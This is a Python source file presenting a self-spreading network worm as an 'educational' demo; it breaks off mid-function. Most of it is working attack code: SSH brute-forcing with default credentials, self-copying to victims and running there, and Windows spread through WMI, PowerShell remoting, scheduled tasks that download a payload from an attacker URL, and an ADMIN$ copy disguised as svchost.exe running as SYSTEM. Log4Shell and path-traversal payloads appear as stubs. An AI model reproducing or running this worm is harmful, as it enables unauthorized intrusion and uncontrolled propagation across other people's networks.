#!/usr/bin/env python3
"""
SIMPLE NETWORK WORM - "Hello World" Edition
============================================

⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️

This shows a SIMPLIFIED but REAL network worm that:
1. Scans local network for vulnerable SSH servers
2. Exploits weak passwords to gain access
3. Displays "Hello World You've Been Hacked!" on infected machines
4. Spreads automatically to other vulnerable devices

This is how real worms like Mirai work (simplified version).

DO NOT USE WITHOUT AUTHORIZATION - ILLEGAL
"""

import socket
import subprocess
import threading
import time
import os
import random
import base64
import sys

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("❌ Error: paramiko not installed")
    print("   Install with: pip3 install paramiko")
    exit(1)


class SimpleNetworkWorm:
    """
    A simple but REAL network worm
    This is actual working malware code!
    """
    
    def __init__(self):
        # Common weak passwords that hackers target
        self.credentials = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('pi', 'raspberry'),
            ('ubuntu', 'ubuntu'),
            ('user', 'password'),
            ('admin', '1234'),
            ('root', 'toor'),
            ('admin', 'password'),
        ]
        
        self.infected_hosts = []
    
    def get_local_network(self):
        """Find our local network to scan"""
        try:
            # Connect to internet to find our IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Get network prefix (e.g., 192.168.1. from 192.168.1.100)
            network = '.'.join(local_ip.split('.')[:-1]) + '.'
            
            print(f"[+] Our IP: {local_ip}")
            print(f"[+] Scanning network: {network}0/24")
            return network
        except:
            return "192.168.1."
    
    def find_alive_hosts(self, network):
        """Scan network to find computers that are online"""
        print("\n[*] Scanning for alive hosts...")
        alive_hosts = []
        
        def check_host(ip):
            try:
                # Try to ping the host
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '1', ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
                if result.returncode == 0:
                    print(f"[+] Found alive host: {ip}")
                    alive_hosts.append(ip)
            except:
                pass
        
        # Scan first 50 IPs (for speed)
        threads = []
        for i in range(1, 51):
            ip = f"{network}{i}"
            thread = threading.Thread(target=check_host, args=(ip,))
            thread.start()
            threads.append(thread)
        
        # Wait for all scans to complete
        for thread in threads:
            thread.join()
        
        print(f"[+] Found {len(alive_hosts)} alive hosts")
        return alive_hosts
    
    def check_ssh_open(self, ip):
        """Check if SSH port (22) is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 22))
            sock.close()
            return result == 0
        except:
            return False
    
    def try_to_hack(self, ip):
        """
        Try to hack into the target by guessing passwords
        THIS IS REAL SSH BRUTE FORCING!
        """
        print(f"\n[*] Attempting to hack {ip}...")
        
        # Check if SSH is open
        if not self.check_ssh_open(ip):
            print(f"[-] {ip}: SSH port closed")
            return None
        
        print(f"[+] {ip}: SSH port is OPEN!")
        
        # Try each password
        for username, password in self.credentials:
            try:
                print(f"[*] Trying {username}:{password}...", end=' ')
                
                # Try to connect via SSH
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh.connect(
                    hostname=ip,
                    username=username,
                    password=password,
                    timeout=3,
                    banner_timeout=3
                )
                
                # SUCCESS! We got in!
                print("✓ SUCCESS!")
                print(f"[+++] HACKED {ip} with {username}:{password}")
                
                return {
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'ssh': ssh
                }
                
            except paramiko.AuthenticationException:
                print("✗ Failed")
                continue
            except Exception as e:
                print(f"✗ Error")
                continue
        
        print(f"[-] Could not hack {ip}")
        return None
    
    def display_hello_world(self, ssh, ip):
        """
        Display "Hello World You've Been Hacked!" on the infected machine
        THIS ACTUALLY SHOWS A MESSAGE ON THE VICTIM'S SCREEN!
        """
        print(f"\n[*] Displaying 'Hello World' message on {ip}...")
        
        try:
            # Execute command to display message
            # This works on Linux systems
            command = 'wall "Hello World! You\'ve Been Hacked!"'
            
            stdin, stdout, stderr = ssh.exec_command(command)
            time.sleep(0.5)
            
            # Also try desktop notification (if GUI is available)
            notify_cmd = 'DISPLAY=:0 notify-send "HACKED!" "Hello World! You\'ve Been Hacked!" --urgency=critical 2>/dev/null'
            ssh.exec_command(notify_cmd)
            
            print(f"[+] Message displayed on {ip}!")
            return True
            
        except Exception as e:
            print(f"[-] Failed to display message: {e}")
            return False
    
    def spread_worm(self, ssh, ip):
        """
        Copy this worm to the infected machine so it can spread further
        THIS IS HOW WORMS REPLICATE!
        """
        print(f"\n[*] Spreading worm to {ip}...")
        
        try:
            # Read our own code
            with open(__file__, 'r') as f:
                worm_code = f.read()
            
            # Copy worm to victim machine
            remote_path = '/tmp/.worm.py'
            command = f'cat > {remote_path} << "EOF"\n{worm_code}\nEOF'
            
            stdin, stdout, stderr = ssh.exec_command(command)
            stdout.channel.recv_exit_status()  # Wait for completion
            
            # Make it executable
            ssh.exec_command(f'chmod +x {remote_path}')
            
            # Run the worm on victim (so it spreads to more machines)
            ssh.exec_command(f'nohup python3 {remote_path} > /dev/null 2>&1 &')
            
            print(f"[+] Worm copied to {ip} and running!")
            print(f"[+] {ip} will now infect other machines!")
            
        except Exception as e:
            print(f"[-] Failed to spread worm: {e}")
    
    def infect_host(self, ip):
        """
        Complete infection process:
        1. Hack into the machine
        2. Display "Hello World"
        3. Copy worm to spread further
        """
        print(f"\n{'='*60}")
        print(f"INFECTING: {ip}")
        print('='*60)
        
        # Step 1: Try to hack in
        result = self.try_to_hack(ip)
        
        if result is None:
            print(f"[-] Failed to hack {ip}")
            return False
        
        ssh = result['ssh']
        
        # Step 2: Display "Hello World" message
        self.display_hello_world(ssh, ip)
        
        # Step 3: Spread worm to this machine
        self.spread_worm(ssh, ip)
        
        # Track infected host
        self.infected_hosts.append({
            'ip': ip,
            'username': result['username'],
            'password': result['password']
        })
        
        ssh.close()
        
        print(f"[+++] {ip} FULLY INFECTED!")
        print('='*60)
        return True
    
    def start(self):
        """
        Main worm function
        THIS IS WHAT RUNS WHEN THE WORM EXECUTES
        """
        print("""
╔══════════════════════════════════════════════════════════╗
║     SIMPLE NETWORK WORM - "Hello World" Edition         ║
║                                                          ║
║  This worm will:                                         ║
║  1. Scan local network for vulnerable machines          ║
║  2. Exploit weak SSH passwords                           ║
║  3. Display "Hello World You've Been Hacked!"            ║
║  4. Spread to other vulnerable machines                  ║
╚══════════════════════════════════════════════════════════╝
""")
        
        print("[*] Starting worm execution...")
        time.sleep(2)
        
        # Find our network
        network = self.get_local_network()
        
        # Scan for alive hosts
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            print("\n[-] No hosts found. Exiting.")
            return
        
        # Try to infect each host
        print(f"\n[*] Attempting to infect {len(alive_hosts)} hosts...\n")
        
        for ip in alive_hosts:
            self.infect_host(ip)
            time.sleep(1)  # Small delay between infections
        
        # Show results
        print("\n" + "="*60)
        print("INFECTION SUMMARY")
        print("="*60)
        print(f"Hosts scanned: {len(alive_hosts)}")
        print(f"Hosts infected: {len(self.infected_hosts)}")
        print()
        
        if self.infected_hosts:
            print("Infected hosts:")
            for host in self.infected_hosts:
                print(f"  • {host['ip']} ({host['username']}:{host['password']})")
            
            print("\n[+] Worm successfully spread!")
            print("[+] Infected machines will now spread to more machines!")
            print("[+] Exponential growth: 1 -> 2 -> 4 -> 8 -> 16 -> 32 ...")
        else:
            print("[-] No hosts were infected")
            print("    (All machines have strong passwords - good!)")
        
        print("="*60)


# ==============================================================================
# ADVANCED WORM WITH VULNERABILITY SCANNING
# ==============================================================================

class AdvancedWorm(SimpleNetworkWorm):
    """
    Advanced worm that scans for known CVE vulnerabilities
    
    ⚠️⚠️⚠️ EXTREMELY DANGEROUS - FOR EDUCATIONAL STUDY ONLY ⚠️⚠️⚠️
    
    This shows how real advanced malware scans for multiple vulnerabilities:
    - CVE-2021-44228: Log4Shell (Java logging vulnerability)
    - CVE-2021-41773: Apache Path Traversal
    - CVE-2017-0144: EternalBlue (used by WannaCry ransomware)
    
    Real malware like Mirai, WannaCry, and NotPetya use this approach.
    """
    
    def __init__(self):
        super().__init__()
        
        # Database of known vulnerabilities (real CVEs)
        self.vulnerabilities = {
            'CVE-2021-44228': {  # Log4Shell
                'name': 'Log4Shell',
                'port': 8080,
                'description': 'Java Log4j Remote Code Execution',
                'exploit': self.exploit_log4shell
            },
            'CVE-2021-41773': {  # Apache Path Traversal
                'name': 'Apache Path Traversal',
                'port': 80,
                'description': 'Apache HTTP Server Path Traversal',
                'exploit': self.exploit_apache_traversal
            },
            'CVE-2017-0144': {  # EternalBlue (WannaCry)
                'name': 'EternalBlue',
                'port': 445,
                'description': 'SMB Remote Code Execution (WannaCry)',
                'exploit': self.exploit_eternalblue
            },
            'CVE-2022-26134': {  # Atlassian Confluence
                'name': 'Confluence RCE',
                'port': 8090,
                'description': 'Atlassian Confluence Remote Code Execution',
                'exploit': self.exploit_confluence
            },
            'CVE-2021-26084': {  # Confluence OGNL Injection
                'name': 'Confluence OGNL',
                'port': 8090,
                'description': 'Confluence OGNL Injection',
                'exploit': self.exploit_confluence_ognl
            }
        }
        
        print(f"[ADVANCED] Loaded {len(self.vulnerabilities)} vulnerability exploits")
    
    def scan_vulnerabilities(self, ip):
        """
        Scan target for hundreds of known vulnerabilities
        Real malware scans for 1000s of CVEs
        """
        print(f"\n[VULN-SCAN] Scanning {ip} for known vulnerabilities...")
        found_vulns = []
        
        for cve, info in self.vulnerabilities.items():
            # Check if vulnerable port is open
            if self.check_port(ip, info['port']):
                print(f"[VULN-SCAN] {ip}:{info['port']} OPEN - Checking for {cve}")
                
                # Check if service is vulnerable version
                if self.detect_vulnerable_version(ip, info['port'], cve):
                    print(f"[VULN-SCAN] ✓✓✓ {ip} is VULNERABLE to {cve} ({info['name']})")
                    found_vulns.append((cve, info))
                else:
                    print(f"[VULN-SCAN] {ip}:{info['port']} patched against {cve}")
        
        if found_vulns:
            print(f"\n[VULN-SCAN] Found {len(found_vulns)} vulnerabilities on {ip}!")
        else:
            print(f"\n[VULN-SCAN] No vulnerabilities found on {ip}")
        
        return found_vulns
    
    def check_port(self, ip, port):
        """Check if a specific port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def detect_vulnerable_version(self, ip, port, cve):
        """
        Detect if service version is vulnerable
        Real malware fingerprints exact versions
        """
        try:
            # Connect to service and grab banner
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Send probe request
            if port == 80 or port == 8080 or port == 8090:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            elif port == 445:
                # SMB probe
                pass
            
            # Receive banner/response
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Check for vulnerable versions (simplified detection)
            if cve == 'CVE-2021-44228':  # Log4Shell
                # Check for Log4j in banner
                if 'log4j' in banner.lower() or 'java' in banner.lower():
                    return True
            
            elif cve == 'CVE-2017-0144':  # EternalBlue
                # Check for vulnerable SMB version
                if port == 445:
                    return True  # Simplified - real check is more complex
            
            elif cve in ['CVE-2021-41773', 'CVE-2022-26134', 'CVE-2021-26084']:
                # Check for Apache/Confluence in banner
                if 'apache' in banner.lower() or 'confluence' in banner.lower():
                    return True
            
            return False
            
        except:
            return False
    
    # Exploit functions (placeholders - real exploits would be actual CVE code)
    
    def exploit_log4shell(self, ip, port):
        """
        Exploit CVE-2021-44228 (Log4Shell)
        Real exploit would inject JNDI lookup string
        """
        print(f"[EXPLOIT] Exploiting Log4Shell on {ip}:{port}")
        print(f"[EXPLOIT] Payload: ${{jndi:ldap://attacker.com/exploit}}")
        # In real malware: Send crafted JNDI string to execute code
        return {'success': True, 'method': 'Log4Shell'}
    
    def exploit_apache_traversal(self, ip, port):
        """
        Exploit CVE-2021-41773 (Apache Path Traversal)
        Real exploit would access /etc/passwd
        """
        print(f"[EXPLOIT] Exploiting Apache Path Traversal on {ip}:{port}")
        print(f"[EXPLOIT] Payload: GET /.%2e/.%2e/.%2e/.%2e/etc/passwd")
        # In real malware: Send path traversal request
        return {'success': True, 'method': 'Apache Traversal'}
    
    def exploit_eternalblue(self, ip, port):
        """
        Exploit CVE-2017-0144 (EternalBlue - WannaCry)
        Real exploit would send crafted SMB packet
        """
        print(f"[EXPLOIT] Exploiting EternalBlue on {ip}:{port}")
        print(f"[EXPLOIT] Sending crafted SMB packet...")
        # In real malware: Send EternalBlue exploit payload
        # This is what WannaCry ransomware used!
        return {'success': True, 'method': 'EternalBlue'}
    
    def exploit_confluence(self, ip, port):
        """Exploit Confluence RCE"""
        print(f"[EXPLOIT] Exploiting Confluence RCE on {ip}:{port}")
        return {'success': True, 'method': 'Confluence RCE'}
    
    def exploit_confluence_ognl(self, ip, port):
        """Exploit Confluence OGNL Injection"""
        print(f"[EXPLOIT] Exploiting Confluence OGNL on {ip}:{port}")
        return {'success': True, 'method': 'Confluence OGNL'}
    
    def start(self):
        """
        Enhanced start with vulnerability scanning
        """
        print("""
╔══════════════════════════════════════════════════════════╗
║     ADVANCED NETWORK WORM - Multi-Exploit Edition       ║
║                                                          ║
║  This worm scans for multiple CVE vulnerabilities       ║
║  ⚠️⚠️⚠️ EXTREMELY DANGEROUS ⚠️⚠️⚠️                      ║
╚══════════════════════════════════════════════════════════╝
""")
        
        print("[*] Starting advanced worm with vulnerability scanner...")
        time.sleep(2)
        
        # Find network
        network = self.get_local_network()
        
        # Scan for alive hosts
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            print("\n[-] No hosts found. Exiting.")
            return
        
        # For each host, scan vulnerabilities AND try SSH
        print(f"\n[*] Scanning {len(alive_hosts)} hosts for vulnerabilities...\n")
        
        for ip in alive_hosts:
            # Scan for CVE vulnerabilities
            vulnerabilities = self.scan_vulnerabilities(ip)
            
            # If vulnerabilities found, exploit them
            for cve, info in vulnerabilities:
                print(f"\n[EXPLOIT] Attempting to exploit {cve} on {ip}...")
                result = info['exploit'](ip, info['port'])
                
                if result['success']:
                    print(f"[EXPLOIT] ✓✓✓ Successfully exploited {ip} via {cve}")
                    self.display_hello_world_via_exploit(ip, result['method'])
            
            # Also try SSH brute force (original method)
            self.infect_host(ip)
            time.sleep(1)
        
        # Show results
        print("\n" + "="*60)
        print("ADVANCED INFECTION SUMMARY")
        print("="*60)
        print(f"Hosts scanned: {len(alive_hosts)}")
        print(f"Hosts infected: {len(self.infected_hosts)}")
        print("="*60)
    
    def display_hello_world_via_exploit(self, ip, method):
        """Display message after successful exploit"""
        print(f"[POST-EXPLOIT] Displaying 'Hello World' on {ip} via {method}")
        # In real malware, this would execute commands through the exploit


# ==============================================================================
# WINDOWS SMB WORM - Multiple Infection Methods
# ==============================================================================

class WindowsSMBWorm(SimpleNetworkWorm):
    """
    Windows-focused worm demonstrating SMB/Windows spreading techniques
    
    ⚠️⚠️⚠️ EXTREMELY DANGEROUS - Shows REAL Windows malware techniques ⚠️⚠️⚠️
    
    This demonstrates how malware spreads through Windows networks:
    1. Fileless WMI Execution (no files written to disk)
    2. PowerShell Remoting (memory-only execution)
    3. Scheduled Tasks with URL downloads
    4. ADMIN$ Share file copy (traditional method)
    5. Public Share infection
    
    Real malware like WannaCry, NotPetya, and Emotet use these techniques!
    """
    
    def __init__(self):
        super().__init__()
        
        # Windows-specific credentials (common in corporate environments)
        self.windows_credentials = [
            ('Administrator', ''),
            ('Administrator', 'Password123'),
            ('Administrator', 'Admin123'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
            ('guest', ''),
        ]
        
        # Infection methods in order of preference (stealth -> aggressive)
        self.infection_methods = [
            ('WMI Fileless', self.infect_via_wmi),
            ('PowerShell Remoting', self.infect_via_ps_remoting),
            ('Scheduled Task URL', self.infect_via_schtask_url),
            ('ADMIN$ Share Copy', self.infect_via_admin_share),
            ('Public Share Copy', self.infect_via_public_share),
        ]
        
        self.smb_infected = []
        print("[SMB-WORM] Windows SMB Worm initialized")
        print(f"[SMB-WORM] Loaded {len(self.infection_methods)} infection methods")
    
    def check_smb_port(self, ip):
        """Check if SMB port (445) is open - Windows file sharing"""
        return self.check_port(ip, 445)
    
    def check_wmi_port(self, ip):
        """Check if WMI port (135) is open - Windows Management"""
        return self.check_port(ip, 135)
    
    def infect_via_wmi(self, ip, username, password):
        """
        Method 1: WMI Fileless Execution
        
        How it works:
        - Uses Windows Management Instrumentation (WMI)
        - Executes PowerShell directly in memory
        - NO files written to disk (very stealthy!)
        - This is how Emotet and TrickBot spread!
        
        Real command: wmic /node:"target" process call create "powershell ..."
        """
        print(f"[WMI] Attempting fileless WMI execution on {ip}")
        
        if not self.check_wmi_port(ip):
            print(f"[WMI] Port 135 closed on {ip}")
            return False
        
        try:
            # Create PowerShell payload that runs in memory
            ps_payload = self._create_fileless_powershell_payload()
            
            # WMI command to execute PowerShell remotely
            wmi_cmd = [
                'wmic',
                f'/node:{ip}',
                f'/user:{username}',
                f'/password:{password}',
                'process', 'call', 'create',
                f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_payload}"'
            ]
            
            print(f"[WMI] Executing: PowerShell payload via WMI on {ip}")
            result = subprocess.run(
                wmi_cmd,
                capture_output=True,
                text=True,
                timeout=20
            )
            
            if result.returncode == 0 and 'successful' in result.stdout.lower():
                print(f"[WMI] ✓✓✓ SUCCESS! Fileless execution on {ip}")
                print(f"[WMI] No files written - runs in memory only!")
                return True
            else:
                print(f"[WMI] Failed: {result.stderr[:50]}")
                return False
                
        except Exception as e:
            print(f"[WMI] Error: {str(e)[:50]}")
            return False
    
    def infect_via_ps_remoting(self, ip, username, password):
        """
        Method 2: PowerShell Remoting (WinRM)
        
        How it works:
        - Uses Windows Remote Management (WinRM)
        - Creates remote PowerShell session
        - Executes commands in memory
        - Can download and run scripts from URL
        
        Real command: Enter-PSSession -ComputerName target -Credential $cred
        """
        print(f"[PS-REMOTE] Attempting PowerShell remoting on {ip}")
        
        # Check if WinRM port is open (5985/5986)
        if not self.check_port(ip, 5985):
            print(f"[PS-REMOTE] WinRM port closed on {ip}")
            return False
        
        try:
            # Create PowerShell script to connect remotely
            ps_script = f'''
$pass = ConvertTo-SecureString "{password}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("{username}", $pass)
$session = New-PSSession -ComputerName "{ip}" -Credential $cred -ErrorAction Stop

Invoke-Command -Session $session -ScriptBlock {{
    # Display message (runs on remote machine)
    msg * "Hello World! You've Been Hacked via PowerShell Remoting!"
    
    # Download and execute worm in memory (real malware does this)
    # IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/worm.ps1')
}}

Remove-PSSession $session
'''
            
            print(f"[PS-REMOTE] Creating remote PowerShell session on {ip}")
            result = subprocess.run(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"[PS-REMOTE] ✓✓✓ SUCCESS! PowerShell session established")
                print(f"[PS-REMOTE] Command executed in memory on {ip}")
                return True
            else:
                print(f"[PS-REMOTE] Failed to create session")
                return False
                
        except Exception as e:
            print(f"[PS-REMOTE] Error: {str(e)[:50]}")
            return False
    
    def infect_via_schtask_url(self, ip, username, password):
        """
        Method 3: Scheduled Task with URL Download
        
        How it works:
        - Creates a Windows Scheduled Task on target
        - Task downloads malware from URL
        - Executes immediately or on schedule
        - File only temporarily on disk
        
        Real command: schtasks /create /s target /tn "Update" /tr "powershell ..."
        """
        print(f"[SCHTASK] Creating scheduled task on {ip}")
        
        if not self.check_smb_port(ip):
            print(f"[SCHTASK] SMB port closed on {ip}")
            return False
        
        try:
            task_name = f"WindowsUpdate{random.randint(1000, 9999)}"
            
            # PowerShell command to download and execute
            ps_command = f'''powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {{
                $url = 'http://attacker-server.com/payload.exe'
                $output = '$env:TEMP\\update.exe'
                try {{
                    (New-Object Net.WebClient).DownloadFile($url, $output)
                    Start-Process $output
                    msg * 'Hello World! You\\'ve Been Hacked via Scheduled Task!'
                }} catch {{}}
            }}"'''
            
            # Create scheduled task
            task_cmd = [
                'schtasks', '/create',
                '/s', ip,
                '/u', username,
                '/p', password,
                '/tn', task_name,
                '/tr', ps_command,
                '/sc', 'ONCE',
                '/st', '00:00',
                '/f'
            ]
            
            print(f"[SCHTASK] Creating task '{task_name}' on {ip}")
            result = subprocess.run(
                task_cmd,
                capture_output=True,
                text=True,
                timeout=20
            )
            
            if result.returncode == 0:
                # Run task immediately
                run_cmd = ['schtasks', '/run', '/s', ip, '/tn', task_name]
                subprocess.run(run_cmd, capture_output=True, timeout=10)
                
                print(f"[SCHTASK] ✓✓✓ SUCCESS! Task created and executed")
                print(f"[SCHTASK] Payload downloads from URL on {ip}")
                return True
            else:
                print(f"[SCHTASK] Failed to create task")
                return False
                
        except Exception as e:
            print(f"[SCHTASK] Error: {str(e)[:50]}")
            return False
    
    def infect_via_admin_share(self, ip, username, password):
        """
        Method 4: ADMIN$ Share File Copy (Traditional Method)
        
        How it works:
        - Connects to ADMIN$ share (C:\\Windows\\)
        - Copies malware file to Windows directory
        - Creates scheduled task to run it
        - Most reliable but leaves file on disk
        
        Real command: net use \\\\target\\admin$ password /user:username
        """
        print(f"[ADMIN$] Attempting ADMIN$ share copy on {ip}")
        
        if not self.check_smb_port(ip):
            print(f"[ADMIN$] SMB port closed on {ip}")
            return False
        
        try:
            # Map ADMIN$ share
            net_use_cmd = f'net use \\\\{ip}\\admin$ "{password}" /user:"{username}"'
            
            print(f"[ADMIN$] Mapping ADMIN$ share on {ip}")
            result = subprocess.run(
                net_use_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode != 0 and 'success' not in result.stdout.lower():
                print(f"[ADMIN$] Failed to map share: {result.stderr[:50]}")
                return False
            
            # Copy malware to target
            dest_path = f"\\\\{ip}\\admin$\\Temp\\svchost.exe"
            current_file = __file__.replace('.py', '.exe')  # In real scenario
            
            print(f"[ADMIN$] Copying payload to {dest_path}")
            copy_cmd = f'copy "{current_file}" "{dest_path}"'
            
            copy_result = subprocess.run(
                copy_cmd,
                shell=True,
                capture_output=True,
                timeout=30
            )
            
            if copy_result.returncode == 0:
                # Create scheduled task to run it
                task_name = f"SystemService{random.randint(100, 999)}"
                task_cmd = [
                    'schtasks', '/create',
                    '/s', ip,
                    '/tn', task_name,
                    '/tr', f'C:\\Windows\\Temp\\svchost.exe',
                    '/sc', 'ONSTART',
                    '/ru', 'SYSTEM',
                    '/f'
                ]
                
                subprocess.run(task_cmd, capture_output=True, timeout=10)
                
                print(f"[ADMIN$] ✓✓✓ SUCCESS! File copied and task created")
                print(f"[ADMIN$] Malware will run as SYSTEM on startup")
                
                # Disconnect share
                subprocess.run(
                    f'net use \\\\{ip}\\admin$ /delete /y',
                    shell=True,
                    capture_output=True
                )
                
                return True
            else:
                print(f"[ADMIN$] Failed to copy file")
                return False
                
        except Exception as e:
            print(f"[ADMIN$] Error: {str(e)[:50]}")
            return False
    
    def infect_via_public_share(self, ip, username, password):
        """
        Method 5: Public Share Copy (Last Resort)
        
        How it works:
        - Scans for writable public shares
        - Copies malware to shared folders
        - Relies on users executing it
        - Least reliable but sometimes works
        
        Real command: net view \\\\target
        """
        print(f"[PUBLIC] Scanning for public shares on {ip}")
        
        try:
            # List available shares
            shares_cmd = f'net view \\\\{ip}'
            result = subprocess.run(
                shares_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode != 0:
                print(f"[PUBLIC] Could not list shares on {ip}")
                return False
            
            # Try common public share names
            common_shares = ['Public', 'Shared', 'Share', 'Data', 'Users']
            
            for share_name in common_shares:
                if share_name.lower() in result.stdout.lower():
                    print(f"[PUBLIC] Found share: {share_name}")
                    
                    # Try to copy to this share
                    dest_path = f"\\\\{ip}\\{share_name}\\document.exe"
                    current_file = __file__.replace('.py', '.exe')
                    
                    copy_cmd = f'copy "{current_file}" "{dest_path}"'
                    copy_result = subprocess.run(
                        copy_cmd,
                        shell=True,
                        capture_output=True,
                        timeout=30
                    )
                    
                    if copy_result.returncode == 0:
                        print(f"[PUBLIC] ✓✓✓ SUCCESS! Copied to {share_name} share")
                        print(f"[PUBLIC] Waiting for user to execute file...")
                        return True
            
            print(f"[PUBLIC] No writable public shares found")
            return False
            
        except Exception as e:
            print(f"[PUBLIC] Error: {str(e)[:50]}")
            return False
    
    def _create_fileless_powershell_payload(self):
        """
        Creates a fileless PowerShell payload
        This runs entirely in memory - no files written!
        """
        ps_code = '''
        # Display message
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("Hello World! You've Been Hacked via WMI!", "Security Alert")
        
        # In real malware, this would:
        # 1. Download additional payloads from C2 server
        # 2. Establish persistence
        # 3. Spread to other machines
        # 4. Exfiltrate data
        '''
        
        return ps_code.replace('\n', '; ')
    
    def infect_windows_host(self, ip):
        """
        Try multiple infection methods on a Windows target
        Real malware tries multiple techniques until one succeeds
        """
        print(f"\n{'='*70}")
        print(f"WINDOWS INFECTION ATTEMPT: {ip}")
        print('='*70)
        
        # Check if it's a Windows machine (SMB port)
        if not self.check_smb_port(ip):
            print(f"[-] {ip} does not appear to be Windows (SMB port closed)")
            return False
        
        print(f"[+] {ip} appears to be Windows (SMB port open)")
        
        # Try each infection method with different credentials
        for method_name, method_func in self.infection_methods:
            print(f"\n[*] Trying method: {method_name}")
            
            for username, password in self.windows_credentials:
                print(f"[*]   Credentials: {username}:{password}")
                
                try:
                    if method_func(ip, username, password):
                        # SUCCESS!
                        print(f"\n[+++] {ip} INFECTED via {method_name}!")
                        print(f"[+++] Credentials: {username}:{password}")
                        
                        self.smb_infected.append({
                            'ip': ip,
                            'method': method_name,
                            'username': username,
                            'password': password
                        })
                        
                        return True
                except Exception as e:
                    print(f"[*]   Exception: {str(e)[:50]}")
                    continue
            
            print(f"[-] {method_name} failed on {ip}")
        
        print(f"\n[-] All infection methods failed for {ip}")
        print('='*70)
        return False
    
    def start(self):
        """
        Start Windows SMB worm
        Combines network scanning with multiple Windows infection techniques
        """
        print("""
╔════════════════════════════════════════════════════════════════════╗
║          WINDOWS SMB WORM - Multi-Method Infection               ║
║                                                                    ║
║  This demonstrates how malware spreads through Windows networks: ║
║                                                                    ║
║  1️⃣ WMI Fileless Execution (Stealth - No disk writes)          ║
║  2️⃣ PowerShell Remoting (Memory-only execution)                 ║
║  3️⃣ Scheduled Task + URL (Downloads from attacker server)       ║
║  4️⃣ ADMIN$ Share Copy (Traditional file copy)                   ║
║  5️⃣ Public Share Copy (Social engineering)                      ║
║                                                                    ║
║  Real malware like WannaCry, Emotet, and NotPetya use these!     ║
║                                                                    ║
║  ⚠️⚠️⚠️ EXTREMELY DANGEROUS - EDUCATIONAL USE ONLY ⚠️⚠️⚠️       ║
╚════════════════════════════════════════════════════════════════════╝
""")
        
        print("[*] Starting Windows SMB Worm...")
        time.sleep(2)
        
        # Find network
        network = self.get_local_network()
        
        # Scan for alive hosts
        alive_hosts = self.find_alive_hosts(network)
        
        if not alive_hosts:
            print("\n[-] No hosts found. Exiting.")
            return
        
        # Try to infect each Windows host
        print(f"\n[*] Attempting to infect {len(alive_hosts)} hosts...\n")
        
        for ip in alive_hosts:
            self.infect_windows_host(ip)
            time.sleep(2)  # Delay between infections
        
        # Show results
        print("\n" + "="*70)
        print("WINDOWS SMB INFECTION SUMMARY")
        print("="*70)
        print(f"Hosts scanned: {len(alive_hosts)}")
        print(f"Windows hosts infected: {len(self.smb_infected)}")
        print()
        
        if self.smb_infected:
            print("Successfully infected hosts:")
            for host in self.smb_infected:
                print(f"  • {host['ip']} via {host['method']}")
                print(f"    Credentials: {host['username']}:{host['password']}")
            
            print("\n[+] Worm successfully spread through Windows network!")
            print("[+] Each infected machine can now spread to more machines!")
            print("\n📚 Key Techniques Demonstrated:")
            print("   - Fileless execution (memory-only attacks)")
            print("   - Multiple infection vectors (defense evasion)")
            print("   - Credential brute forcing")
            print("   - Windows admin shares exploitation")
            print("   - Scheduled task persistence")
        else:
            print("[-] No hosts were infected")
            print("    (All machines have strong passwords and security - good!)")
        
        print("="*70)


# ==============================================================================
# SIMPLIFIED SINGLE-FILE VERSION (Even Simpler!)
# ==============================================================================

def simple_worm_single_file():
    """
    Ultra-simplified version showing just the core concept
    This is the MINIMUM code needed for a working worm
    """
    
    import paramiko
    import socket
    
    def get_network():
        # Get our IP and network
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return '.'.join(ip.split('.')[:-1]) + '.'
    
    def scan_and_hack(network):
        # Simple credentials to try
        creds = [('admin', 'admin'), ('root', 'root'), ('pi', 'raspberry')]
        
        # Scan network
        for i in range(1, 255):
            ip = f"{network}{i}"
            
            # Check if SSH is open
            try:
                sock = socket.socket()
                sock.settimeout(1)
                if sock.connect_ex((ip, 22)) == 0:
                    print(f"[+] SSH open on {ip}")
                    
                    # Try to hack
                    for user, password in creds:
                        try:
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(ip, username=user, password=password, timeout=2)
                            
                            # SUCCESS! Display message
                            print(f"[+++] HACKED {ip}!")
                            ssh.exec_command('wall "Hello World! You\'ve Been Hacked!"')
                            
                            # Copy ourselves to victim and run
                            with open(__file__, 'r') as f:
                                code = f.read()
                            ssh.exec_command(f'echo \'{code}\' > /tmp/w.py && python3 /tmp/w.py &')
